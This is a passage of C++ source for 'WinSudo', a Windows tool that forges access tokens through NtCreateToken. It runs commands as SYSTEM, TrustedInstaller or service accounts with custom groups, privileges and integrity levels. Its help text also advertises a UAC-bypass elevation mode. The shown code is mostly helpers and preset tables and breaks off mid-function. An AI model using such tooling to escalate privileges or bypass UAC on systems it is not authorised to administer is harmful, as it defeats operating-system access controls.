/*
compile commandline:
-lWtsApi32 -lUserenv -lntdll -ladvapi32 -lgdi32 -lcomctl32 -lMsftedit -static -lcomdlg32 -luuid -lole32 -static
*/

#undef UNICODE
#include <Windows.h>
#include <WtsApi32.h>
#include <Userenv.h>
#include <TlHelp32.h>
#include <CommCtrl.h>
#include <stdio.h>
#include <stdarg.h>
#include <string>
#include <vector>
#include <sstream>
#include <sddl.h>
#include <Richedit.h>
#include <ntdef.h>
#include <shobjidl.h>
#include <winternl.h>

// ==========================================
// 全局配置
// ==========================================

bool g_bDebug = false, g_bUIAccess = false;
std::vector<std::string> extraGroups;
std::vector<int> RemovePrivilege, DisabledPrivilege;
int g_WindowCreateMode = SW_SHOWNORMAL;
DWORD Integrity_Level = SECURITY_MANDATORY_SYSTEM_RID;
HWND g_hLogEdit = NULL, g_hGroupEditor = NULL, g_hPrivEditor = NULL; // 跟踪编辑器窗口句柄
LPSTR g_desktop = NULL, g_runCommand = (LPSTR)"cmd.exe", g_identityStr = (LPSTR)"NT AUTHORITY\\SYSTEM";

// ==========================================
// 日志系统
// ==========================================

void WriteToStdOut(const char* str) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE || hOut == NULL) return;
    DWORD written;
    if (!WriteConsoleA(hOut, str, strlen(str), &written, NULL)) {
        WriteFile(hOut, str, strlen(str), &written, NULL);
    }
}

enum LogLevel { LOG_ERROR, LOG_WARN, LOG_INFO, LOG_SUCCESS, LOG_DEBUG };

void Log(LogLevel level, const char* format, ...) {
    if (g_hLogEdit && IsWindow(g_hLogEdit)) {
        if (!g_bDebug && level == LOG_DEBUG) return;

        std::string msg;
        COLORREF color = RGB(200, 200, 200); // 默认灰色
        switch (level) {
        case LOG_ERROR:   msg = "[!] "; color = RGB(255, 0, 0); break; // 红
        case LOG_WARN:    msg = "[-] "; color = RGB(255, 128, 0); break; // 橙
        case LOG_INFO:    msg = "[*] "; color = RGB(0, 128, 255); break; // 蓝
        case LOG_SUCCESS: msg = "[+] "; color = RGB(0, 180, 0); break; // 绿
        case LOG_DEBUG:   msg = "[D] "; color = RGB(128, 128, 128); break; // 灰
        }

        char buffer[2048];
        va_list args;
        va_start(args, format);
        vsnprintf(buffer, sizeof(buffer), format, args);
        va_end(args);

        msg += buffer;
        msg += "\r\n";

        int len = GetWindowTextLengthA(g_hLogEdit);
        SendMessageA(g_hLogEdit, EM_SETSEL, (WPARAM)len, (LPARAM)len);

        CHARFORMAT2 cf;
        ZeroMemory(&cf, sizeof(cf));
        cf.cbSize = sizeof(cf);
        cf.dwMask = CFM_COLOR;
        cf.crTextColor = color;
        // 消除背景色影响
        cf.dwEffects = 0;

        SendMessage(g_hLogEdit, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);

        // 3. 追加文本
        SendMessage(g_hLogEdit, EM_REPLACESEL, 0, (LPARAM)msg.c_str());

        // 4. 滚动到底部
        SendMessage(g_hLogEdit, WM_VSCROLL, SB_BOTTOM, 0);
    }
    else {
        if (!g_bDebug && level != LOG_ERROR && level != LOG_WARN) return;

        const char* prefix = "";
        HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hOut != INVALID_HANDLE_VALUE && hOut != NULL) {
            CONSOLE_SCREEN_BUFFER_INFO csbi;
            WORD wOldColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
            if (GetConsoleScreenBufferInfo(hOut, &csbi)) {
                wOldColor = csbi.wAttributes;
            }
            WORD wColor = wOldColor;

            switch (level) {
            case LOG_ERROR:   prefix = "[!] "; wColor = FOREGROUND_RED | FOREGROUND_INTENSITY; break;
            case LOG_WARN:    prefix = "[-] "; wColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
            case LOG_INFO:    prefix = "[*] "; wColor = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
            case LOG_SUCCESS: prefix = "[+] "; wColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
            case LOG_DEBUG:   prefix = "[D] "; wColor = FOREGROUND_INTENSITY; break;
            }

            SetConsoleTextAttribute(hOut, wColor);
            WriteToStdOut(prefix);

            char buffer[4096];
            va_list args;
            va_start(args, format);
            vsnprintf(buffer, sizeof(buffer), format, args);
            va_end(args);
            WriteToStdOut(buffer);
            WriteToStdOut("\r\n");

            SetConsoleTextAttribute(hOut, wOldColor);
        }
    }
}

void Log_ErrorCode(LogLevel level, DWORD ErrorCode) {
    CHAR MessageBuf[2048] = {};
    if (FormatMessageA(
        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        ErrorCode,
        0,
        MessageBuf,
        2048,
        NULL
    )) {
        Log(level, "错误信息：%s", MessageBuf);
    }
}

// ==========================================
// NT API 定义
// ==========================================

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef NTSTATUS(NTAPI* PNtCreateToken)(
    PHANDLE, ACCESS_MASK, PVOID, TOKEN_TYPE, PLUID, PLARGE_INTEGER,
    PTOKEN_USER, PTOKEN_GROUPS, PTOKEN_PRIVILEGES, PTOKEN_OWNER,
    PTOKEN_PRIMARY_GROUP, PTOKEN_DEFAULT_DACL, PVOID);

// ==========================================
// 辅助工具函数
// ==========================================

void ShowUsage_Brief(const char* prog) {
    printf("\n");
    printf("WinSudo v3.2.0 - 以任意身份运行程序\n");
    printf("================================\n\n");
    printf("用法: %s [选项] [命令 (默认为 cmd.exe)]\n\n", prog);
    printf("预设:\n");
    printf("  -Use:<名称>      使用一个预设 (将会使用预设对应的用户与组，后面带+即可删除不应该有的特权)\n");
    printf("                    预设选择: S/S+, A/A+, TI/TI+, LS/LS+, NS/NS+, DWM/DWM+ (对应的用户名与全称可以使用 \"%s --help\" 查看)\n", prog);
    printf("身份选项:\n");
    printf("  -U:<名称|SID>     指定运行身份 (默认: System)\n");
    printf("                    快捷方式: S, A, TI, LS, NS, DWM (对应的用户名与全称可以使用 \"%s --help\" 查看)\n", prog);
    printf("令牌选项:\n");
    printf("  -G:<组名>         向令牌添加额外的组 (含空格需加引号)\n");
    printf("  --UIAccess        让令牌有 UI Access\n");
    printf("  -IL:<完整性级别>    设置令牌的完整性级别\n");
    printf("  可用完整性级别选项可在 \"%s --help\" 查看\n", prog);
    printf("  请注意，完整性级别选项修改后，一些特权将会被系统强制移除!\n");
    printf("运行选项:\n");
    printf("  -B, --Bypass      使用 UAC Bypass 方式提权\n");
    printf("  --Debug           显示调试信息\n");
    printf("  -GUI              使用图形化界面\n");
    printf("  -d:<桌面>         设置启动的桌面\n");
    printf("  -C:<目录>         设置启动路径 (不包含使用当前路径启动)\n");
    printf("  -M:<选项>         以指定窗口模式选项创建进程 (不包含使用默认窗口模式选项)\n");
    printf("  可用选项可在 \"%s --help\" 查看\n", prog);
    printf("  -h, /?    显示此帮助\n");
    printf("  --help    显示详细版的帮助\n\n");
    printf("特权选项:\n");
    printf("  -Remove:<特权>    移除指定特权\n");
    printf("  -Disabled:<特权>   禁用指定特权\n");
    printf("  可使用 \"%s --help\" 查看如何使用\n", prog);
    printf("示例可在 \"%s --help\" 查看\n", prog);
}

void ShowUsage_Detailed(const char* prog) {
    printf("\n");
    printf("WinSudo v3.2.0 - 以任意身份运行程序\n");
    printf("================================\n\n");
    printf("用法: %s [选项] [命令 (默认为 cmd.exe)]\n\n", prog);
    printf("预设:\n");
    printf("  -Use:<名称>      使用一个预设 (将会使用预设对应的用户与组，后面带+即可删除不应该有的特权)\n");
    printf("  预设选择: S/S+, A/A+, TI/TI+, LS/LS+, NS/NS+, DWM/DWM+\n");
    printf("      S, System, S+, System+  (NT AUTHORITY\\SYSTEM)\n");
    printf("      A, Admin, A+, Admin+  (BUILTIN\\Administrators)\n");
    printf("      TI, TrustedInstaller, TI+, TrustedInstaller+  (NT SERVICE\\TrustedInstaller)\n");
    printf("      LS, LOCAL SERVICE, LS+, LOCAL SERVICE+  (NT AUTHORITY\\LOCAL SERVICE)\n");
    printf("      NS, NETWORK SERVICE, NS+, NETWORK SERVICE+  (NT AUTHORITY\\NETWORK SERVICE)\n");
    printf("      DWM, DWM+  (Window Manager\\DWM-1)\n");
    printf("身份选项:\n");
    printf("  -U:<名称|SID>     指定运行身份 (默认: System)\n");
    printf("  快捷方式:\n");
    printf("      S, System  (NT AUTHORITY\\SYSTEM)\n");
    printf("      A, Admin  (BUILTIN\\Administrators)\n");
    printf("      TI, TrustedInstaller  (NT SERVICE\\TrustedInstaller)\n");
    printf("      LS, LOCAL SERVICE  (NT AUTHORITY\\LOCAL SERVICE)\n");
    printf("      NS, NETWORK SERVICE  (NT AUTHORITY\\NETWORK SERVICE)\n");
    printf("      DWM  (Window Manager\\DWM-1)\n");
    printf("令牌选项:\n");
    printf("  -G:<组名>         向令牌添加额外的组 (含空格需加引号)\n");
    printf("  --UIAccess        让令牌有 UI Access\n");
    printf("  -IL:<完整性级别>    设置令牌的完整性级别\n");
    printf("  可用完整性级别选项:\n");
    printf("      U, Untrusted  非信任级 (SECURITY_MANDATORY_UNTRUSTED_RID)\n");
    printf("      L, Low        低完整性级 (SECURITY_MANDATORY_LOW_RID)\n");
    printf("      M, Medium     中等完整性级 (SECURITY_MANDATORY_MEDIUM_RID)\n");
    printf("      M+, Medium+   中等增强级 (SECURITY_MANDATORY_MEDIUM_PLUS_RID)\n");
    printf("      H, High       高完整性级 (SECURITY_MANDATORY_HIGH_RID)\n");
    printf("      S, System     系统完整性级 (SECURITY_MANDATORY_SYSTEM_RID)\n");
    printf("  请注意，完整性级别选项修改后，一些特权将会被系统强制移除!\n");
    printf("运行选项:\n");
    printf("  -B, --Bypass      使用 UAC Bypass 方式提权\n");
    printf("  --Debug           显示调试信息\n");
    printf("  -GUI              使用图形化界面\n");
    printf("  -d:<桌面>         设置启动的桌面\n");
    printf("  -C:<目录>         设置启动路径 (不包含使用当前路径启动)\n");
    printf("  -M:<选项>         以指定窗口模式选项创建进程 (不包含使用默认窗口模式选项)\n");
    printf("  可用选项: \n");
    printf("      I, Inline     内联模式 (在当前控制台运行)\n");
    printf("      H, Hide       隐藏窗口\n");
    printf("      Max, Maximize 最大化\n");
    printf("      Min, Minimize 最小化\n");
    printf("  -h, /?    显示简略版的帮助\n");
    printf("  --help    显示此帮助\n\n");
    printf("特权选项:\n");
    printf("  -Remove:<特权>    移除指定特权\n");
    printf("  -Disabled:<特权>   禁用指定特权\n");
    printf("  特权名对应序号(<特权>可使用序号或特权名):\n");
    printf("    SeCreateTokenPrivilege:1\n");
    printf("    SeAssignPrimaryTokenPrivilege:2\n");
    printf("    SeLockMemoryPrivilege:3\n");
    printf("    SeIncreaseQuotaPrivilege:4\n");
    printf("    SeMachineAccountPrivilege:5\n");
    printf("    SeTcbPrivilege:6\n");
    printf("    SeSecurityPrivilege:7\n");
    printf("    SeTakeOwnershipPrivilege:8\n");
    printf("    SeLoadDriverPrivilege:9\n");
    printf("    SeSystemProfilePrivilege:10\n");
    printf("    SeSystemtimePrivilege:11\n");
    printf("    SeProfileSingleProcessPrivilege:12\n");
    printf("    SeIncreaseBasePriorityPrivilege:13\n");
    printf("    SeCreatePagefilePrivilege:14\n");
    printf("    SeCreatePermanentPrivilege:15\n");
    printf("    SeBackupPrivilege:16\n");
    printf("    SeRestorePrivilege:17\n");
    printf("    SeShutdownPrivilege:18\n");
    printf("    SeDebugPrivilege:19\n");
    printf("    SeAuditPrivilege:20\n");
    printf("    SeSystemEnvironmentPrivilege:21\n");
    printf("    SeChangeNotifyPrivilege:22\n");
    printf("    SeRemoteShutdownPrivilege:23\n");
    printf("    SeUndockPrivilege:24\n");
    printf("    SeSyncAgentPrivilege:25\n");
    printf("    SeEnableDelegationPrivilege:26\n");
    printf("    SeManageVolumePrivilege:27\n");
    printf("    SeImpersonatePrivilege:28\n");
    printf("    SeCreateGlobalPrivilege:29\n");
    printf("    SeTimeZonePrivilege:30\n");
    printf("    SeCreateSymbolicLinkPrivilege:31\n");
    printf("    SeRelabelPrivilege:32\n");
    printf("    SeIncreaseWorkingSetPrivilege:33\n");
    printf("    SeTrustedCredManAccessPrivilege:34\n");
    printf("    SeDelegateSessionUserImpersonatePrivilege:35\n");
    printf("示例:\n");
    printf("  %s -U:TI cmd.exe                         以 TrustedInstaller 身份运行 cmd\n", prog);
    printf("  %s -M:I cmd.exe                          以 SYSTEM 身份内联运行 cmd\n", prog);
    printf("  %s -GUI                                  显示图形化界面\n", prog);
    printf("  %s -P:winsta0\\winlogon cmd.exe           在 winlogon 安全桌面启动 SYSTEM 身份的 cmd\n", prog);
    printf("  %s --UIAccess cmd.exe                    以 SYSTEM 身份运行带有 UIAccess 标志的 cmd\n", prog);
    printf("  %s -IL:Medium cmd.exe                    以 SYSTEM 身份运行中等完整性级的 cmd\n", prog);
    printf("  %s -G:\"CONSOLE LOGON\" cmd.exe            添加控制台登录组, 以 SYSTEM 身份运行 cmd\n", prog);
    printf("  %s -B -U:S cmd.exe                       使用 bypass 方式, 以 SYSTEM 身份运行 cmd\n", prog);
    printf("  %s cmd /k echo \"hello world\"             运行带参数的命令\n", prog);
}

LPSTR GetCurrentLpDesktop() {
    HDESK hDesk = GetThreadDesktop(GetCurrentThreadId());
    if (!hDesk) return NULL;

    HWINSTA hWinsta = GetProcessWindowStation();
    if (!hWinsta) return NULL;

    char desk[256], winsta[256];
    DWORD needed;

    if (!GetUserObjectInformationA(hDesk, UOI_NAME,
        desk, sizeof(desk), &needed))
        return NULL;

    if (!GetUserObjectInformationA(hWinsta, UOI_NAME,
        winsta, sizeof(winsta), &needed))
        return NULL;

    size_t len = strlen(winsta) + strlen(desk) + 2;
    LPSTR p = (LPSTR)LocalAlloc(LMEM_FIXED, len);
    if (!p) return NULL;

    _snprintf(p, len, "%s\\%s", winsta, desk);
    return p;
}

BOOL IsUserAnAdmin() {
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    BOOL b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
    if (b) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) b = FALSE;
        FreeSid(AdministratorsGroup);
    }
    return b;
}

void DeleteDisabledPrivileges(HANDLE& hToken) {
    DWORD len = 0;
    GetTokenInformation(hToken, TokenPrivileges, nullptr, 0, &len);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)return;

    PTOKEN_PRIVILEGES tp = (PTOKEN_PRIVILEGES)malloc(len);
    if (!tp)return;

    if (!GetTokenInformation(hToken, TokenPrivileges, tp, len, &len)) {
        free(tp);
        return;
    }

    std::vector<LUID_AND_ATTRIBUTES> toRemove;
    toRemove.reserve(tp->PrivilegeCount);

    for (DWORD i = 0; i < tp->PrivilegeCount; ++i) {
        const auto& p = tp->Privileges[i];
        if ((p.Attributes & SE_PRIVILEGE_ENABLED) == 0) {
            toRemove.push_back({ p.Luid, 0 });
        }
    }
    free(tp);
    if (toRemove.empty()) return;

    HANDLE hNewToken = nullptr;
    if (!CreateRestrictedToken(hToken, 0, 0, nullptr, (DWORD)toRemove.size(), toRemove.data(), 0, nullptr, &hNewToken)) return;

    CloseHandle(hToken);
    hToken = hNewToken;
}

DWORD GetActiveSessionID() {
    DWORD count = 0;
    PWTS_SESSION_INFOA pSessionInfo = NULL;
    DWORD activeSessionId = (DWORD)-1;
    if (WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &count)) {
        for (DWORD i = 0; i < count; ++i) {
            if (pSessionInfo[i].State == WTSActive) {
                activeSessionId = pSessionInfo[i].SessionId;
                break;
            }
        }
        WTSFreeMemory(pSessionInfo);
    }
    if (activeSessionId == (DWORD)-1)
        ProcessIdToSessionId(GetCurrentProcessId(), &activeSessionId);
    return activeSessionId;
}

BOOL EnablePrivilege(HANDLE hToken, LPCSTR privilegeName) {
    HANDLE hTokenToUse = hToken;
    BOOL bMyToken = FALSE;
    if (hTokenToUse == NULL) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenToUse))
            return FALSE;
        bMyToken = TRUE;
    }
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
        if (bMyToken) CloseHandle(hTokenToUse);
        return FALSE;
    }
    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
    BOOL r = AdjustTokenPrivileges(hTokenToUse, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    if (bMyToken) CloseHandle(hTokenToUse);
    if (r && (err == ERROR_SUCCESS)) return 1;
    else {
        Log(LOG_ERROR, "启用 %s 特权失败，错误码：%d", privilegeName, err);
        return 0;
    }
}

DWORD GetPidByNameA(LPCSTR processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, processName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

PSID DupSid(PSID src) {
    if (!src) return NULL;
    DWORD len = GetLengthSid(src);
    PSID dst = (PSID)HeapAlloc(GetProcessHeap(), 0, len);
    if (dst) CopySid(len, dst, src);
    return dst;
}

PSID GetSidFromString(LPCSTR str) {
    PSID sid = NULL;
    if (ConvertStringSidToSidA(str, &sid)) {
        PSID dup = DupSid(sid);
        LocalFree(sid);
        return dup;
    }
    return NULL;
}

PSID GetSidForAccountName(LPCSTR accountName) {
    DWORD sidLen = 0, domainLen = 0;
    SID_NAME_USE use;
    LookupAccountNameA(NULL, accountName, NULL, &sidLen, NULL, &domainLen, &use);
    if (sidLen > 0) {
        PSID sid = (PSID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sidLen);
        char* domain = (char*)HeapAlloc(GetProcessHeap(), 0, domainLen);
        if (sid && domain && LookupAccountNameA(NULL, accountName, sid, &sidLen, domain, &domainLen, &use)) {
            HeapFree(GetProcessHeap(), 0, domain);
            return sid;
        }
        if (domain) HeapFree(GetProcessHeap(), 0, domain);
        if (sid) HeapFree(GetProcessHeap(), 0, sid);
    }
    return NULL;
}

PSID ResolveIdentity(const char* identityStr) {
    if (_stricmp(identityStr, "S") == 0 || _stricmp(identityStr, "System") == 0) {
        Log(LOG_DEBUG, "映射: %s -> SYSTEM", identityStr);
        return GetSidFromString("NT AUTHORITY\\SYSTEM");
    }
    if (_stricmp(identityStr, "A") == 0 || _stricmp(identityStr, "Admin") == 0) {
        Log(LOG_DEBUG, "映射: %s -> Administrators", identityStr);
        return GetSidFromString("BUILTIN\\Administrators");
    }
    if (_stricmp(identityStr, "TI") == 0 || _stricmp(identityStr, "TrustedInstaller") == 0) {
        Log(LOG_DEBUG, "映射: %s -> TrustedInstaller", identityStr);
        return GetSidForAccountName("NT SERVICE\\TrustedInstaller");
    }
    if (_stricmp(identityStr, "LS") == 0 || _stricmp(identityStr, "LOCAL SERVICE") == 0) {
        Log(LOG_DEBUG, "映射: %s -> LOCAL SERVICE", identityStr);
        return GetSidFromString("NT AUTHORITY\\LOCAL SERVICE");
    }
    if (_stricmp(identityStr, "NS") == 0 || _stricmp(identityStr, "NETWORK SERVICE") == 0) {
        Log(LOG_DEBUG, "映射: %s -> NETWORK SERVICE", identityStr);
        return GetSidForAccountName("NT SERVICE\\NETWORK SERVICE");
    }
    if (_stricmp(identityStr, "DWM") == 0) {
        Log(LOG_DEBUG, "映射: %s -> Window Manager\\DWM-1", identityStr);
        return GetSidForAccountName("Window Manager\\DWM-1");
    }
    PSID sid = GetSidFromString(identityStr);
    if (sid) return sid;
    return GetSidForAccountName(identityStr);
}

DWORD ResolveILlevel(const char* level) {
    if (_stricmp(level, "untrusted") == 0 || _stricmp(level, "u") == 0)return SECURITY_MANDATORY_UNTRUSTED_RID;
    if (_stricmp(level, "low") == 0 || _stricmp(level, "l") == 0)return SECURITY_MANDATORY_LOW_RID;
    if (_stricmp(level, "medium") == 0 || _stricmp(level, "m") == 0)return SECURITY_MANDATORY_MEDIUM_RID;
    if (_stricmp(level, "medium+") == 0 || _stricmp(level, "m+") == 0)return SECURITY_MANDATORY_MEDIUM_PLUS_RID;
    if (_stricmp(level, "high") == 0 || _stricmp(level, "h") == 0)return SECURITY_MANDATORY_HIGH_RID;
    if (_stricmp(level, "system") == 0 || _stricmp(level, "s") == 0)return SECURITY_MANDATORY_SYSTEM_RID;
    return (DWORD)-1;
}

struct Preset{
    LPSTR identityStr;
    std::vector<std::string> extraGroups;
    std::vector<int> RemovePrivilege;
};
Preset ResolvePreset(const char* arg) {
    // =========================================================
    // Normal
    // =========================================================
    if (_stricmp(arg, "Normal") == 0) {
        return { (LPSTR)"NT AUTHORITY\\SYSTEM", {}, {} }; 
    }

    // =========================================================
    // Admin (A / Admin)
    // =========================================================
    // 默认 (全能)
    if (_stricmp(arg, "A") == 0 || _stricmp(arg, "Admin") == 0) {
        return { (LPSTR)"BUILTIN\\Administrators", {}, {} }; 
    }
    // 加固 (还原真实 Admin 缺少的特权)
    if (_stricmp(arg, "A+") == 0 || _stricmp(arg, "Admin+") == 0) {
        return { (LPSTR)"BUILTIN\\Administrators", {}, { 1, 3, 5, 6, 15, 20, 25, 26, 32, 34 } };
    }

    // =========================================================
    // System (S / System)
    // =========================================================
    // 默认 (全能)
    if (_stricmp(arg, "S") == 0 || _stricmp(arg, "System") == 0) {
        return { (LPSTR)"NT AUTHORITY\\SYSTEM", {}, {} };
    }
    // 加固 (还原真实 System 缺少的特权)
    if (_stricmp(arg, "S+") == 0 || _stricmp(arg, "System+") == 0) {
        return { (LPSTR)"NT AUTHORITY\\SYSTEM", {}, 
            { 1, 3, 5, 10, 11, 14, 23, 25, 26, 30, 31, 32, 33, 35 } };
    }

    // =========================================================
    // TrustedInstaller (TI / TrustedInstaller)
    // =========================================================
    // 默认 (全能)
    if (_stricmp(arg, "TI") == 0 || _stricmp(arg, "TrustedInstaller") == 0) {
        return { (LPSTR)"NT AUTHORITY\\SYSTEM", 
            { "NT AUTHORITY\\SERVICE", "NT SERVICE\\TrustedInstaller" }, {} };
    }
    // 加固 (还原真实 TI 缺少的特权)
    if (_stricmp(arg, "TI+") == 0 || _stricmp(arg, "TrustedInstaller+") == 0) {
        return { (LPSTR)"NT AUTHORITY\\SYSTEM", 
            { "NT AUTHORITY\\SERVICE", "NT SERVICE\\TrustedInstaller" }, 
            { 1, 5, 23, 25, 26, 32, 34 } };
    }

    // =========================================================
    // NETWORK SERVICE (NS / NETWORK SERVICE)
    // =========================================================
    // 默认 (全能)
    if (_stricmp(arg, "NS") == 0 || _stricmp(arg, "NETWORK SERVICE") == 0) {
        return { (LPSTR)"NT AUTHORITY\\NETWORK SERVICE", { "NT AUTHORITY\\SERVICE" }, {} };
    }
    // 加固 (还原真实 NS 缺少的特权)
    if (_stricmp(arg, "NS+") == 0 || _stricmp(arg, "NETWORK SERVICE+") == 0) {
        return { (LPSTR)"NT AUTHORITY\\NETWORK SERVICE", { "NT AUTHORITY\\SERVICE" }, 
            { 1, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 
              19, 21, 23, 25, 26, 27, 31, 32, 34, 35 } };
    }

    // =========================================================
    // LOCAL SERVICE (LS / LOCAL SERVICE)
    // =========================================================
    // 默认 (全能)
    if (_stricmp(arg, "LS") == 0 || _stricmp(arg, "LOCAL SERVICE") == 0) {
        return { (LPSTR)"NT AUTHORITY\\LOCAL SERVICE", { "NT AUTHORITY\\SERVICE" }, {} };
    }
    // 加固 (还原真实 LS 缺少的特权)
    if (_stricmp(arg, "LS+") == 0 || _stricmp(arg, "LOCAL SERVICE+") == 0) {
        return { (LPSTR)"NT AUTHORITY\\LOCAL SERVICE", { "NT AUTHORITY\\SERVICE" }, 
            { 1, 3, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 
              19, 21, 23, 25, 26, 27, 31, 32, 34, 35 } };
    }

    // =========================================================
    // DWM
    // =========================================================
    // 默认 (全能)
    if (_stricmp(arg, "DWM") == 0) {
        return { (LPSTR)"Window Manager\\DWM-1", 
            { "S-1-5-4", "S-1-5-19", "S-1-5-90-0" }, {} };
    }
    // 加固 (还原真实 DWM 缺少的特权，仅保留 13, 22, 29, 33)
    if (_stricmp(arg, "DWM+") == 0) {
        return { (LPSTR)"Window Manager\\DWM-1", 
            { "NT AUTHORITY\\INTERACTIVE", "NT AUTHORITY\\LOCAL SERVICE", "Window Manager\\Window Manager Group" }, 
            { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 30, 31, 32, 34, 35 } };
    }

    return {NULL, {}, {}};
}

int ResolvePrivilegeId(const char* name) {
    if (_stricmp(name, "SeCreateTokenPrivilege") == 0 || strcmp(name, "1") == 0) return 1;
    if (_stricmp(name, "SeAssignPrimaryTokenPrivilege") == 0 || strcmp(name, "2") == 0) return 2;
    if (_stricmp(name, "SeLockMemoryPrivilege") == 0 || strcmp(name, "3") == 0) return 3;
    if (_stricmp(name, "SeIncreaseQuotaPrivilege") == 0 || strcmp(name, "4") == 0) return 4;
    if (_stricmp(name, "SeMachineAccountPrivilege") == 0 || strcmp(name, "5") == 0) return 5;
    if (_stricmp(name, "SeTcbPrivilege") == 0 || strcmp(name, "6") == 0) return 6;
    if (_stricmp(name, "SeSecurityPrivilege") == 0 || strcmp(name, "7") == 0) return 7;
    if (_stricmp(name, "SeTakeOwnershipPrivilege") == 0 || strcmp(name, "8") == 0) return 8;
    if (_stricmp(name, "SeLoadDriverPrivilege") == 0 || strcmp(name, "9") == 0) return 9;
    if (_stricmp(name, "SeSystemProfilePrivilege") == 0 || strcmp(name, "10") == 0) return 10;
    if (_stricmp(name, "SeSystemtimePrivilege") == 0 || strcmp(name, "11") == 0) return 11;
    if (_stricmp(name, "SeProfileSingleProcessPrivilege") == 0 || strcmp(name, "12") == 0) return 12;
    if (_stricmp(name, "SeIncreaseBasePriorityPrivilege") == 0 || strcmp(name, "13") == 0) return 13;
    if (_stricmp(name, "SeCreatePagefilePrivilege") == 0 || strcmp(name, "14") == 0) return 14;
    if (_stricmp(name, "SeCreatePermanentPrivilege") == 0 || strcmp(name, "15") == 0) return 15;
    if (_stricmp(name, "SeBackupPrivilege") == 0 || strcmp(name, "16") == 0) return 16;
    if (_stricmp(name, "SeRestorePrivilege") == 0 || strcmp(name, "17") == 0) return 17;
    if (_stricmp(name, "SeShutdownPrivilege") == 0 || strcmp(name, "18") == 0) return 18;
    if (_stricmp(name, "SeDebugPrivilege") == 0 || strcmp(name, "19") == 0) return 19;
    if (_stricmp(name, "SeAuditPrivilege") == 0 || strcmp(name, "20") == 0) return 20;
    if (_stricmp(name, "SeSystemEnvironmentPrivilege") == 0 || strcmp(name, "21") == 0) return 21;
    if (_stricmp(name, "SeChangeNotifyPrivilege") == 0 || strcmp(name, "22") == 0) return 22;
    if (_stricmp(name, "SeRemoteShutdownPrivilege") == 0 || strcmp(name, "23") == 0) return 23;
    if (_stricmp(name, "SeUndockPrivilege") == 0 || strcmp(name, "24") == 0) return 24;
    if (_stricmp(name, "SeSyncAgentPrivilege") == 0 || strcmp(name, "25") == 0) return 25;
    if (_stricmp(name, "SeEnableDelegationPrivilege") == 0 || strcmp(name, "26") == 0) return 26;
    if (_stricmp(name, "SeManageVolumePrivilege") == 0 || strcmp(name, "27") == 0) return 27;
    if (_stricmp(name, "SeImpersonatePrivilege") == 0 || strcmp(name, "28") == 0) return 28;
    if (_stricmp(name, "SeCreateGlobalPrivilege") == 0 || strcmp(name, "29") == 0) return 29;
    if (_stricmp(name, "SeTimeZonePrivilege") == 0 || strcmp(name, "30") == 0) return 30;
    if (_stricmp(name, "SeCreateSymbolicLinkPrivilege") == 0 || strcmp(name, "31") == 0) return 31;
    if (_stricmp(name, "SeRelabelPrivilege") == 0 || strcmp(name, "32") == 0) return 32;
    if (_stricmp(name, "SeIncreaseWorkingSetPrivilege") == 0 || strcmp(name, "33") == 0) return 33;
    if (_stricmp(name, "SeTrustedCredManAccessPrivilege") == 0 || strcmp(name, "34") == 0) return 34;
    if (_stricmp(name, "SeDelegateSessionUserImpersonatePrivilege") == 0 || strcmp(name, "35") == 0) return 35;
    return -1;
}

int ResolveWindowCreateMode(const char* arg) {
    if (_stricmp(arg, "I") == 0 || _stricmp(arg, "Inline") == 0) return -1;
    if (_stricmp(arg, "H") == 0 || _stricmp(arg, "Hide") == 0) return SW_HIDE;
    if (_stricmp(arg, "Max") == 0 || _stricmp(arg, "Maximize") == 0) return SW_SHOWMAXIMIZED;
    if (_stricmp(arg, "Min") == 0 || _stricmp(arg, "Minimize") == 0) return SW_SHOWMINIMIZED;
    return -2; // 未识别
}

PSID GetLogonSid() {
    HANDLE h;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h)) return NULL;
    DWORD l = 0;
    GetTokenInformation(h, TokenGroups, 0, 0, &l);
    std::vector<BYTE> b(l);
    GetTokenInformation(h, TokenGroups, b.data(), l, &l);
    CloseHandle(h);

    PTOKEN_GROUPS g = (PTOKEN_GROUPS)b.data();
    for (DWORD i = 0; i < g->GroupCount; i++) {
